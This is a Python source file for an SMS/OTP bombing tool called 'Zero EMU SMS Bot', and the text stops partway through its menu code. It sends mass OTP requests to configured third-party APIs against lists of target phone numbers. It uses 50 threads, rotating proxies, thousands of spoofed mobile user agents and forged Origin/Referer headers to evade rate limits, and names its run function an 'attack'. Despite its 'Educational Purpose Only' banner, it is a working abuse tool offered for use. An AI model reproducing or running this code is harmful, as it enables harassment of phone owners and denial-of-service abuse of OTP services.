#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║     ███████╗███████╗██████╗  ██████╗     ███████╗███╗   ███╗██╗   ██╗       ║
║     ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    ██╔════╝████╗ ████║██║   ██║       ║
║       ███╔╝ █████╗  ██████╔╝██║   ██║    █████╗  ██╔████╔██║██║   ██║       ║
║      ███╔╝  ██╔══╝  ██╔══██╗██║   ██║    ██╔══╝  ██║╚██╔╝██║██║   ██║       ║
║     ███████╗███████╗██║  ██║╚██████╔╝    ███████╗██║ ╚═╝ ██║╚██████╔╝       ║
║     ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝     ╚═╝ ╚═════╝        ║
║                                                                            ║
║     ███████╗███╗   ███╗███████╗     ██████╗  ██████╗ ████████╗             ║
║     ██╔════╝████╗ ████║██╔════╝     ██╔══██╗██╔═══██╗╚══██╔══╝             ║
║     ███████╗██╔████╔██║█████╗       ██████╔╝██║   ██║   ██║                ║
║     ╚════██║██║╚██╔╝██║██╔══╝       ██╔══██╗██║   ██║   ██║                ║
║     ███████║██║ ╚═╝ ██║███████╗     ██████╔╝╚██████╔╝   ██║                ║
║     ╚══════╝╚═╝     ╚═╝╚══════╝     ╚═════╝  ╚═════╝    ╚═╝                ║
║                                                                            ║
║               SMS SENDING BOT BOARD v3.0 — GOLD EDITION                    ║
║         Multi-Proxy | Multi-Thread | 7000+ UA Rotation | Country Switch      ║
║                      Educational Purpose Only                               ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import random
import socket
import hashlib
import threading
import requests
import urllib.parse
from queue import Queue
from datetime import datetime
from colorama import Fore, Back, Style, init
from urllib.parse import urlparse

# ─── Initialize ───
init(autoreset=True)
CONFIG_FILE = "config.json"
LOG_DIR = "logs"
BAD_PROXY_FILE = "bad_proxies.txt"

# ─── Ensure directories ───
os.makedirs(LOG_DIR, exist_ok=True)

# ═══════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════

DEFAULT_CONFIG = {
    "threads": 50,
    "delay": 0.2,
    "timeout": 8,
    "max_retries": 2,
    "rotate_proxy": True,
    "rotate_ua": True,
    "rotate_mode": "random",
    "country_switch": False,
    "country_codes": ["+880"],
    "numbers_file": "numbers.txt",
    "proxies_file": "proxies.txt",
    "ua_file": "user_agents.txt",
    "api_endpoints": [],
    "api_payloads": [],
    "request_count": 0,
    "success_count": 0,
    "fail_count": 0,
    "running": False,
    "log_requests": True,
    "show_live_stats": True,
    "auto_retry_on_fail": True,
}

# ═══════════════════════════════════════════════════════════════
# 7000+ User Agent Generator (iPhone + Android)
# ═══════════════════════════════════════════════════════════════

# iPhone Models (all models from iPhone 4 to iPhone 16 Pro Max)
IPHONE_MODELS = [
    "iPhone16,2", "iPhone16,1", "iPhone15,5", "iPhone15,4", "iPhone15,3",
    "iPhone15,2", "iPhone15,1", "iPhone14,8", "iPhone14,7", "iPhone14,6",
    "iPhone14,5", "iPhone14,4", "iPhone14,3", "iPhone14,2", "iPhone14,1",
    "iPhone13,5", "iPhone13,4", "iPhone13,3", "iPhone13,2", "iPhone13,1",
    "iPhone12,8", "iPhone12,5", "iPhone12,3", "iPhone12,1",
    "iPhone11,8", "iPhone11,6", "iPhone11,4", "iPhone11,2",
    "iPhone10,6", "iPhone10,5", "iPhone10,4", "iPhone10,3", "iPhone10,2", "iPhone10,1",
    "iPhone9,4", "iPhone9,3", "iPhone9,2", "iPhone9,1",
    "iPhone8,4", "iPhone8,2", "iPhone8,1",
    "iPhone7,2", "iPhone7,1",
    "iPhone6,2", "iPhone6,1",
    "iPhone5,4", "iPhone5,3", "iPhone5,2", "iPhone5,1",
    "iPhone4,1", "iPhone3,3", "iPhone3,1", "iPhone2,1", "iPhone1,2",
]

# iOS versions (12.0 through 18.5 with sub-versions)
IOS_VERSIONS = [
    "18_5", "18_4", "18_3", "18_2", "18_1", "18_0",
    "17_7", "17_6", "17_5", "17_4", "17_3", "17_2", "17_1", "17_0",
    "16_7", "16_6", "16_5", "16_4", "16_3", "16_2", "16_1", "16_0",
    "15_8", "15_7", "15_6", "15_5", "15_4", "15_3", "15_2", "15_1", "15_0",
    "14_8", "14_7", "14_6", "14_5", "14_4", "14_3", "14_2", "14_1", "14_0",
    "13_7", "13_6", "13_5", "13_4", "13_3", "13_2", "13_1", "13_0",
    "12_5", "12_4", "12_3", "12_2", "12_1", "12_0",
]

# Safari versions matching iOS
SAFARI_VERSIONS = [
    "18.5", "18.4", "18.3", "18.2", "18.1", "18.0",
    "17.7", "17.6", "17.5", "17.4", "17.3", "17.2", "17.1", "17.0",
    "16.7", "16.6", "16.5", "16.4", "16.3", "16.2", "16.1", "16.0",
    "15.8", "15.7", "15.6", "15.5", "15.4", "15.3", "15.2", "15.1", "15.0",
    "14.8", "14.7", "14.6", "14.5", "14.4", "14.3", "14.2", "14.1", "14.0",
    "13.7", "13.6", "13.5", "13.4", "13.3", "13.2", "13.1", "13.0",
    "12.5", "12.4", "12.3", "12.2", "12.1", "12.0",
]

# Chrome for iOS versions
CHROME_IOS = [
    "135.0.7049.83", "134.0.6998.89", "133.0.6943.84", "132.0.6834.83",
    "131.0.6778.85", "130.0.6723.90", "129.0.6668.78", "128.0.6613.127",
    "127.0.6533.106", "126.0.6478.153", "125.0.6422.113", "124.0.6367.111",
    "123.0.6312.99", "122.0.6261.111", "121.0.6167.184", "120.0.6099.230",
    "119.0.6045.199", "118.0.5993.99", "117.0.5938.62", "116.0.5845.63",
    "115.0.5790.89", "114.0.5735.110", "113.0.5672.110", "112.0.5615.70",
    "111.0.5563.91", "110.0.5481.156", "109.0.5414.91", "108.0.5359.88",
    "107.0.5304.83", "106.0.5249.86", "105.0.5195.82", "104.0.5112.72",
    "103.0.5060.68", "102.0.5005.78", "101.0.4951.62", "100.0.4896.60",
]

# Firefox for iOS versions
FIREFOX_IOS = [
    "130.0", "129.0", "128.0", "127.0", "126.0", "125.0", "124.0",
    "123.0", "122.0", "121.0", "120.0", "119.0", "118.0", "117.0",
    "116.0", "115.0", "114.0", "113.0", "112.0", "111.0", "110.0",
]

# Android models — Samsung
SAMSUNG_MODELS = [
    "SM-S938B", "SM-S936B", "SM-S931B", "SM-S928B", "SM-S926B",
    "SM-S921B", "SM-S918B", "SM-S916B", "SM-S911B",
    "SM-S908B", "SM-S906B", "SM-S901B",
    "SM-F956B", "SM-F946B", "SM-F936B", "SM-F926B",
    "SM-F741B", "SM-F731B", "SM-F721B", "SM-F711B",
    "SM-Z900F", "SM-Z910F",
    "SM-A556B", "SM-A546B", "SM-A536B", "SM-A526B", "SM-A515F",
    "SM-A346E", "SM-A256E", "SM-A245F", "SM-A236E",
    "SM-A155F", "SM-A146B", "SM-A145P", "SM-A136B",
    "SM-A047F", "SM-A037F",
    "SM-G998B", "SM-G996B", "SM-G991B", "SM-G990B",
    "SM-G781B", "SM-G780F", "SM-G770F",
    "SM-N986U", "SM-N985F", "SM-N976B", "SM-N975U", "SM-N971F",
    "SM-T970", "SM-T860", "SM-T720",
]

# Android models — Xiaomi/Redmi/Poco
XIAOMI_MODELS = [
    "24030PN60G", "2401FTC34G", "2311FJN4DG", "23116PN5BC",
    "2311BPN23C", "23078PND5G", "23043RP34G",
    "22101320G", "2211133C", "22081212C",
    "2207117BPG", "22071219AI", "22041219G",
    "2201116SG", "2112123AG", "21121119SC",
    "2109119SG", "21091116G", "21081111RG",
    "2107113SG", "21061119AG", "21051182G",
    "M2102J20SG", "M2011K2G", "M2011J18G",
    "M2007J3SG", "M2007J22G", "M2007J17G",
    "M2006C3MG", "M2006C3LG", "M2003J15SC",
    "Mi 11", "Mi 11X", "Mi 11T", "Mi 11i",
    "Mi 10T", "Mi 10T Pro", "Mi 10", "Mi 10 Pro",
    "Redmi Note 13", "Redmi Note 13 Pro", "Redmi Note 13 Pro+",
    "Redmi Note 12", "Redmi Note 12 Pro", "Redmi Note 12S",
    "Redmi Note 11", "Redmi Note 11S", "Redmi Note 11 Pro",
    "Redmi Note 10", "Redmi Note 10S", "Redmi Note 10 Pro",
    "Redmi 13C", "Redmi 12", "Redmi 12C",
    "Poco F6", "Poco F5", "Poco X6", "Poco X5",
    "Poco M6", "Poco M5", "Poco M4",
]

# Android models — Google Pixel
PIXEL_MODELS = [
    "Pixel 9 Pro XL", "Pixel 9 Pro", "Pixel 9", "Pixel 9a",
    "Pixel 8a", "Pixel 8 Pro", "Pixel 8",
    "Pixel 7a", "Pixel 7 Pro", "Pixel 7",
    "Pixel 6a", "Pixel 6 Pro", "Pixel 6",
    "Pixel 5a 5G", "Pixel 5",
    "Pixel 4a 5G", "Pixel 4 XL", "Pixel 4",
    "Pixel 3a XL", "Pixel 3a", "Pixel 3 XL", "Pixel 3",
    "Pixel 2 XL", "Pixel 2",
    "Pixel XL", "Pixel",
]

# Android models — OnePlus
ONEPLUS_MODELS = [
    "OnePlus 12", "OnePlus 12R", "OnePlus 11", "OnePlus 11R",
    "OnePlus 10T", "OnePlus 10 Pro", "OnePlus 10R",
    "OnePlus 9RT", "OnePlus 9 Pro", "OnePlus 9R", "OnePlus 9",
    "OnePlus 8T", "OnePlus 8 Pro", "OnePlus 8",
    "OnePlus 7T Pro", "OnePlus 7T", "OnePlus 7 Pro", "OnePlus 7",
    "OnePlus 6T", "OnePlus 6",
    "OnePlus Nord 4", "OnePlus Nord 3", "OnePlus Nord 2", "OnePlus Nord",
]

# Android models — Huawei
HUAWEI_MODELS = [
    "HUAWEI P60 Pro", "HUAWEI P60", "HUAWEI P50 Pro", "HUAWEI P50",
    "HUAWEI P40 Pro", "HUAWEI P40", "HUAWEI P30 Pro", "HUAWEI P30",
    "HUAWEI Mate 60 Pro", "HUAWEI Mate 60", "HUAWEI Mate 50 Pro",
    "HUAWEI Mate 40 Pro", "HUAWEI Mate 40",
    "HUAWEI Nova 12 Ultra", "HUAWEI Nova 11 Pro", "HUAWEI Nova 10",
    "ELS-NX9", "ELS-AN00", "NOH-AN00", "NOH-NX9",
    "ANA-AN00", "TAS-AN00", "JAD-AN00",
    "OCE-AN10", "LIO-AN00", "ELE-AN00",
]

# Android versions
ANDROID_VERSIONS = [
    "15", "14", "13", "12", "11", "10", "9", "8.1.0",
    "8.0.0", "7.1.2", "7.0", "6.0.1", "6.0",
    "5.1.1", "5.0.2", "5.0",
]

# Chrome for Android versions
CHROME_ANDROID = [
    "135.0.7049.84", "134.0.6998.90", "133.0.6943.85", "132.0.6834.84",
    "131.0.6778.86", "130.0.6723.91", "129.0.6668.79", "128.0.6613.127",
    "127.0.6533.107", "126.0.6478.153", "125.0.6422.114", "124.0.6367.111",
    "123.0.6312.99", "122.0.6261.111", "121.0.6167.184", "120.0.6099.230",
    "119.0.6045.199", "118.0.5993.99", "117.0.5938.62", "116.0.5845.63",
    "115.0.5790.89", "114.0.5735.110", "113.0.5672.110", "112.0.5615.70",
    "111.0.5563.91", "110.0.5481.156", "109.0.5414.91", "108.0.5359.88",
]

# Samsung Browser versions
SAMSUNG_BROWSER = [
    "27.0", "26.0", "25.0", "24.0", "23.0", "22.0",
    "21.0", "20.0", "19.0", "18.0", "17.0", "16.0",
    "15.0", "14.0", "13.0", "12.0",
]

# Firefox for Android versions
FIREFOX_ANDROID = [
    "130.0", "129.0", "128.0", "127.0", "126.0", "125.0",
    "124.0", "123.0", "122.0", "121.0", "120.0",
    "119.0", "118.0", "117.0", "116.0", "115.0",
]


# ========== UA GENERATOR FUNCTIONS ==========

def gen_iphone_safari():
    """iPhone Safari — ~2700 combinations"""
    model = random.choice(IPHONE_MODELS)
    ios = random.choice(IOS_VERSIONS)
    safari = random.choice(SAFARI_VERSIONS)
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari} Mobile/15E148 Safari/604.1"

def gen_iphone_chrome():
    """iPhone Chrome — ~2000 combinations"""
    model = random.choice(IPHONE_MODELS)
    ios = random.choice(IOS_VERSIONS)
    ch = random.choice(CHROME_IOS)
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{ch} Mobile/15E148 Safari/604.1"

def gen_iphone_firefox():
    """iPhone Firefox — ~1000 combinations"""
    model = random.choice(IPHONE_MODELS)
    ios = random.choice(IOS_VERSIONS)
    ff = random.choice(FIREFOX_IOS)
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/{ff} Mobile/15E148 Safari/604.1"

def gen_iphone_edge():
    """iPhone Edge — ~1000 combinations"""
    model = random.choice(IPHONE_MODELS)
    ios = random.choice(IOS_VERSIONS)
    versions = ["127.0", "126.0", "125.0", "124.0", "123.0", "122.0", "121.0", "120.0"]
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/{random.choice(versions)} Mobile/15E148 Safari/605.1.15"

def gen_samsung_chrome():
    """Samsung + Chrome — ~2500 combinations"""
    model = random.choice(SAMSUNG_MODELS)
    av = random.choice(ANDROID_VERSIONS)
    ch = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {av}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch} Mobile Safari/537.36"

def gen_samsung_browser():
    """Samsung Internet Browser — ~1500 combinations"""
    model = random.choice(SAMSUNG_MODELS)
    av = random.choice(ANDROID_VERSIONS)
    sb = random.choice(SAMSUNG_BROWSER)
    ch = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {av}; SAMSUNG {model}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{sb} Chrome/{ch} Mobile Safari/537.36"

def gen_xiaomi_chrome():
    """Xiaomi + Chrome — ~2000 combinations"""
    model = random.choice(XIAOMI_MODELS)
    av = random.choice(ANDROID_VERSIONS)
    ch = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {av}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch} Mobile Safari/537.36"

def gen_pixel_chrome():
    """Pixel + Chrome — ~1000 combinations"""
    model = random.choice(PIXEL_MODELS)
    av = random.choice(ANDROID_VERSIONS)
    ch = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {av}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch} Mobile Safari/537.36"

def gen_oneplus_chrome():
    """OnePlus + Chrome — ~800 combinations"""
    model = random.choice(ONEPLUS_MODELS)
    av = random.choice(ANDROID_VERSIONS)
    ch = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {av}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch} Mobile Safari/537.36"

def gen_huawei_chrome():
    """Huawei + Chrome — ~800 combinations"""
    model = random.choice(HUAWEI_MODELS)
    av = random.choice(ANDROID_VERSIONS)
    ch = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {av}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch} Mobile Safari/537.36"

def gen_android_firefox():
    """Android + Firefox — ~600 combinations"""
    av = random.choice(ANDROID_VERSIONS)
    ff = random.choice(FIREFOX_ANDROID)
    if random.random() < 0.33:
        model = random.choice(SAMSUNG_MODELS)
    elif random.random() < 0.5:
        model = random.choice(XIAOMI_MODELS)
    else:
        model = random.choice(PIXEL_MODELS + ONEPLUS_MODELS)
    return f"Mozilla/5.0 (Android {av}; Mobile; rv:{ff}.0) Gecko/{ff}.0 Firefox/{ff}.0"

def gen_android_edge():
    """Android Edge — ~600 combinations"""
    av = random.choice(ANDROID_VERSIONS)
    ed = random.choice(["127.0", "126.0", "125.0", "124.0", "123.0", "122.0", "121.0", "120.0"])
    if random.random() < 0.5:
        model = random.choice(SAMSUNG_MODELS)
    else:
        model = random.choice(XIAOMI_MODELS + PIXEL_MODELS)
    return f"Mozilla/5.0 (Linux; Android {av}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ed}.0.0.0 Mobile Safari/537.36 EdgA/{ed}.0.0.0"

def gen_ipad_safari():
    """iPad Safari — ~600 combinations"""
    ios = random.choice(IOS_VERSIONS)
    safari = random.choice(SAFARI_VERSIONS)
    ipad_models = ["iPad14,6", "iPad14,5", "iPad14,4", "iPad14,3", "iPad13,11", "iPad13,10", "iPad13,9", "iPad13,8"]
    return f"Mozilla/5.0 (iPad; CPU OS {ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari} Mobile/15E148 Safari/604.1"

# ─── All UA generators with weights ───
UA_GENERATORS = [
    (gen_iphone_safari, 18),
    (gen_iphone_chrome, 12),
    (gen_iphone_firefox, 6),
    (gen_iphone_edge, 4),
    (gen_samsung_chrome, 15),
    (gen_samsung_browser, 10),
    (gen_xiaomi_chrome, 12),
    (gen_pixel_chrome, 6),
    (gen_oneplus_chrome, 5),
    (gen_huawei_chrome, 5),
    (gen_android_firefox, 3),
    (gen_android_edge, 2),
    (gen_ipad_safari, 2),
]

# ═══════════════════════════════════════════════════════════════
# CORE FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def get_random_ua(custom_uas=None):
    """Get a random user agent — weighted random from all generators"""
    if custom_uas and random.random() < 0.25:
        return random.choice(custom_uas)
    
    generators, weights = zip(*UA_GENERATORS)
    gen = random.choices(generators, weights=weights, k=1)[0]
    return gen()

def get_random_proxy(proxies, mode="random", idx=[0]):
    """Get proxy with rotation mode support"""
    if not proxies:
        return None
    
    if mode == "random":
        p = random.choice(proxies)
    elif mode == "sequential":
        with threading.Lock():
            p = proxies[idx[0] % len(proxies)]
            idx[0] += 1
    else:
        return None
    
    if p.startswith("socks5"):
        return {"http": p.replace("socks5", "socks5h"), "https": p.replace("socks5", "socks5h")}
    return {"http": p, "https": p}

def apply_country(number, country_switch, country_codes):
    """Apply country code switching if enabled"""
    if not country_switch or not country_codes:
        return number
    
    # Remove existing country code if present
    cleaned = number
    for code in country_codes:
        if cleaned.startswith(code):
            cleaned = cleaned[len(code):]
            break
    
    # Add new country code (round-robin)
    idx = random.randint(0, len(country_codes) - 1)
    return country_codes[idx] + cleaned

def load_file(filename, label="data"):
    """Load lines from a text file"""
    try:
        with open(filename, "r", encoding="utf-8") as f:
            data = [line.strip() for line in f if line.strip()]
        print(f"{Fore.GREEN}  [✓] Loaded {len(data)} {label} from {filename}")
        return data
    except FileNotFoundError:
        print(f"{Fore.YELLOW}  [!] File not found: {filename}")
        return []
    except Exception as e:
        print(f"{Fore.RED}  [!] Error loading {filename}: {e}")
        return []

def save_config(config):
    """Save config to JSON file"""
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(config, f, indent=2)
    except:
        pass

def load_config():
    """Load config from JSON file"""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                loaded = json.load(f)
                DEFAULT_CONFIG.update(loaded)
        except:
            pass
    return DEFAULT_CONFIG

# ═══════════════════════════════════════════════════════════════
# REQUEST HEADERS
# ═══════════════════════════════════════════════════════════════

def generate_headers(custom_uas=None, rotate_ua=True):
    """Generate realistic HTTP headers"""
    headers = {
        "User-Agent": get_random_ua(custom_uas) if rotate_ua else "Mozilla/5.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": random.choice([
            "en-US,en;q=0.9",
            "bn-BD,bn;q=0.9,en;q=0.8",
            "hi-IN,hi;q=0.9,en;q=0.8",
            "en-GB,en;q=0.9",
            "ar-SA,ar;q=0.9,en;q=0.8",
            "ur-PK,ur;q=0.9,en;q=0.8",
        ]),
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": random.choice([
            "https://www.google.com",
            "https://m.facebook.com",
            "https://www.imo.im",
            "https://web.whatsapp.com",
        ]),
        "Referer": random.choice([
            "https://www.google.com/",
            "https://m.facebook.com/",
            "https://www.imo.im/",
            "https://accounts.google.com/",
        ]),
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Connection": "keep-alive",
    }
    return headers

# ═══════════════════════════════════════════════════════════════
# OTP SENDER
# ═══════════════════════════════════════════════════════════════

def send_otp_request(target, api_url, payload_template, config, proxies, custom_uas, session):
    """Send a single OTP request with full error handling"""
    if not config["running"]:
        return None
    
    try:
        # Build payload
        final_number = apply_country(target, config["country_switch"], config["country_codes"])
        payload = {}
        for k, v in payload_template.items():
            if v is None:
                payload[k] = final_number
            elif isinstance(v, str):
                payload[k] = v.format(phone=final_number)
            else:
                payload[k] = v
        
        # Build headers
        headers = generate_headers(custom_uas, config["rotate_ua"])
        
        # Get proxy
        proxy = get_random_proxy(proxies, config["rotate_mode"]) if config["rotate_proxy"] else None
        
        # Determine HTTP method from payload or API
        method = "POST"
        params = None
        if "method" in payload:
            method = payload.pop("method", "POST").upper()
        
        # Check if it's GET with query params
        if "?" in api_url:
            method = "GET"
            base_url, qs = api_url.split("?", 1)
            query_params = dict(urllib.parse.parse_qsl(qs))
            query_params.update({k: v for k, v in payload.items() if v and isinstance(v, str)})
            params = query_params
            api_url = base_url
        
        # Make the request
        start_time = time.time()
        
        if method == "GET":
            response = session.get(
                api_url,
                params=params or payload,
                headers=headers,
                proxies=proxy,
                timeout=config["timeout"],
                verify=False
            )
        else:
            response = session.post(
                api_url,
                json=payload,
                headers=headers,
                proxies=proxy,
                timeout=config["timeout"],
                verify=False
            )
        
        elapsed = time.time() - start_time
        success = 200 <= response.status_code < 400
        
        return {
            "success": success,
            "status_code": response.status_code,
            "number": final_number,
            "proxy": proxy["http"] if proxy else "direct",
            "ua": headers["User-Agent"],
            "elapsed": elapsed,
            "response_text": response.text[:200] if not success else "",
        }
        
    except requests.exceptions.ConnectTimeout:
        return {"success": False, "error": "Timeout", "number": target, "status_code": 0}
    except requests.exceptions.ProxyError as e:
        if proxy and "bad_proxies.txt" not in str(e):
            with open(BAD_PROXY_FILE, "a") as f:
                f.write(proxy["http"] + "\n")
        return {"success": False, "error": "Bad Proxy", "number": target, "status_code": 0}
    except requests.exceptions.ConnectionError:
        return {"success": False, "error": "Connection Error", "number": target, "status_code": 0}
    except Exception as e:
        return {"success": False, "error": str(e)[:60], "number": target, "status_code": 0}


# ═══════════════════════════════════════════════════════════════
# WORKER THREAD
# ═══════════════════════════════════════════════════════════════

def worker_thread(queue, config, proxies, custom_uas, stats_lock, stats):
    """Worker thread — processes jobs from queue"""
    session = requests.Session()
    session.verify = False
    requests.packages.urllib3.disable_warnings()
    
    while config["running"]:
        try:
            job = queue.get(timeout=1)
            if job is None:
                break
            
            target, api_url, payload_template = job
            
            # Retry logic
            for attempt in range(config["max_retries"] + 1):
                if not config["running"]:
                    break
                
                result = send_otp_request(target, api_url, payload_template, config, proxies, custom_uas, session)
                
                with stats_lock:
                    config["request_count"] += 1
                    if result and result.get("success"):
                        config["success_count"] += 1
                        print(f"{Fore.GREEN}  ✓ #{config['request_count']:06d} | {result['number']} | {result['status_code']} | {result['proxy'][:20]} | {result['elapsed']:.2f}s")
                    else:
                        config["fail_count"] += 1
                        err = result.get("error", "Unknown") if result else "No response"
                        print(f"{Fore.RED}  ✗ #{config['request_count']:06d} | {target} | {err}")
                        if attempt < config["max_retries"]:
                            time.sleep(0.5)
                            continue
                    break
                
                time.sleep(config["delay"])
            
            queue.task_done()
            
        except:
            continue

# ═══════════════════════════════════════════════════════════════
# ATTACK ENGINE
# ═══════════════════════════════════════════════════════════════

def start_attack(config, numbers, proxies, custom_uas):
    """Start the full attack engine"""
    if not numbers:
        print(f"{Fore.RED}  [!] No numbers loaded! Load numbers first.")
        return
    if not config["api_endpoints"]:
        print(f"{Fore.RED}  [!] No API endpoints set! Set API first (option 7).")
        return
    
    config["running"] = True
    config["request_count"] = 0
    config["success_count"] = 0
    config["fail_count"] = 0
    stats_lock = threading.Lock()
    
    # Create log file
    log_file = f"{LOG_DIR}/attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    with open(log_file, "w") as lf:
        lf.write(f"Zero EMU SMS Sender — Attack Log\n")
        lf.write(f"Started: {datetime.now()}\n")
        lf.write(f"Targets: {len(numbers)}\n")
        lf.write(f"APIs: {len(config['api_endpoints'])}\n")
        lf.write(f"Proxies: {len(proxies)}\n")
        lf.write(f"Threads: {config['threads']}\n")
        lf.write("=" * 60 + "\n")
    
    print(f"\n{Fore.CYAN}  ╔════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}  ║  {Fore.GREEN}🚀 ATTACK STARTED{Fore.CYAN}                                      ║")
    print(f"{Fore.CYAN}  ╠════════════════════════════════════════════════════╣")
    print(f"{Fore.CYAN}  ║  Targets: {len(numbers)}  |  APIs: {len(config['api_endpoints'])}  |  Proxies: {len(proxies)}  ║")
    print(f"{Fore.CYAN}  ║  Threads: {config['threads']}  |  Delay: {config['delay']}s  |  Retry: {config['max_retries']}     ║")
    print(f"{Fore.CYAN}  ║  Log: {log_file}  ║")
    print(f"{Fore.CYAN}  ║  Press {Fore.RED}[X]{Fore.CYAN} in main menu to STOP                        ║")
    print(f"{Fore.CYAN}  ╚════════════════════════════════════════════════════╝\n")
    
    # Start producer thread
    job_queue = Queue(maxsize=10000)
    
    def producer():
        while config["running"]:
            for number in numbers:
                for api, payload in zip(config["api_endpoints"], config["api_payloads"]):
                    if not config["running"]:
                        return
                    try:
                        job_queue.put((number, api, payload), timeout=1)
                    except:
                        pass
                    time.sleep(0.001)  # Small delay to prevent queue overload
    
    # Start worker threads
    thread_list = []
    for _ in range(config["threads"]):
        t = threading.Thread(
            target=worker_thread,
            args=(job_queue, config, proxies, custom_uas, stats_lock, None),
            daemon=True
        )
        t.start()
        thread_list.append(t)
    
    # Start producer
    prod = threading.Thread(target=producer, daemon=True)
    prod.start()
    
    # Live stats display
    if config["show_live_stats"]:
        try:
            while config["running"]:
                time.sleep(2)
                with stats_lock:
                    total = config["request_count"]
                    success = config["success_count"]
                    failed = config["fail_count"]
                    rate = total / 2 if total > 0 else 0
                
                # Update log
                with open(log_file, "a") as lf:
                    lf.write(f"[{datetime.now().strftime('%H:%M:%S')}] Total: {total} | OK: {success} | Fail: {failed} | Rate: {rate:.0f} req/s\n")
                
                # Colorized status line
                if total > 0:
                    pct = (success / total) * 100 if total > 0 else 0
                    bar_len = 30
                    filled = int(bar_len * success / total) if total > 0 else 0
                    bar = f"{Fore.GREEN}{'█' * filled}{Fore.RED}{'█' * (bar_len - filled)}{Style.RESET_ALL}"
                    print(f"\r{Fore.CYAN}  [{datetime.now().strftime('%H:%M:%S')}] Total: {Fore.WHITE}{total:06d} {Fore.GREEN}✓{success:05d} {Fore.RED}✗{failed:05d} {Style.RESET_ALL}| {bar} {Fore.YELLOW}{pct:.1f}% | {Fore.MAGENTA}{rate:.0f} req/s{Style.RESET_ALL}", end="")
                
        except KeyboardInterrupt:
            pass

# ═══════════════════════════════════════════════════════════════
# UI — BANNER
# ═══════════════════════════════════════════════════════════════

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{Fore.RED}
{Fore.RED}  ███████╗███████╗██████╗  ██████╗     ███████╗███╗   ███╗██╗   ██╗{Fore.YELLOW}
{Fore.RED}  ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    ██╔════╝████╗ ████║██║   ██║{Fore.YELLOW}
{Fore.RED}    ███╔╝ █████╗  ██████╔╝██║   ██║    █████╗  ██╔████╔██║██║   ██║{Fore.YELLOW}
{Fore.RED}   ███╔╝  ██╔══╝  ██╔══██╗██║   ██║    ██╔══╝  ██║╚██╔╝██║██║   ██║{Fore.YELLOW}
{Fore.RED}  ███████╗███████╗██║  ██║╚██████╔╝    ███████╗██║ ╚═╝ ██║╚██████╔╝{Fore.YELLOW}
{Fore.RED}  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝     ╚═╝ ╚═════╝ {Fore.YELLOW}
{Fore.CYAN}  ════════════════════════════════════════════════════════════════{Fore.YELLOW}
{Fore.CYAN}      SMS SENDING BOT BOARD v3.0 — GOLD EDITION{Fore.YELLOW}
{Fore.CYAN}      Multi-Proxy | Multi-Thread | 7000+ UA Rotation{Fore.YELLOW}
{Fore.CYAN}      Educational Use Only — Test on Authorized Systems Only{Fore.YELLOW}
{Fore.CYAN}  ════════════════════════════════════════════════════════════════{Style.RESET_ALL}
    """)

# ═══════════════════════════════════════════════════════════════
# UI — MAIN MENU
# ═══════════════════════════════════════════════════════════════

def show_status(config, numbers, proxies, custom_uas):
    """Show current configuration status"""
    print(f"{Fore.CYAN}  ┌─── {Fore.YELLOW}CURRENT STATUS{Fore.CYAN} ────────────────────────────────────────────┐")
    print(f"{Fore.CYAN}  │ {Fore.WHITE}📱 Numbers   : {Fore.GREEN}{len(numbers):<5}{Fore.CYAN}  {Fore.WHITE}🌐 Proxies  : {Fore.GREEN}{len(proxies):<5}{Fore.CYAN}  {Fore.WHITE}UA (custom): {Fore.GREEN}{len(custom_uas):<4}  {Fore.CYAN}│")
    print(f"{Fore.CYAN}  │ {Fore.WHITE}🔗 APIs      : {Fore.GREEN}{len(config['api_endpoints']):<5}{Fore.CYAN}  {Fore.WHITE}Threads   : {Fore.GREEN}{config['threads']:<5}{Fore.CYAN}  {Fore.WHITE}Delay     : {Fore.GREEN}{config['delay']}s  {Fore.CYAN}│")
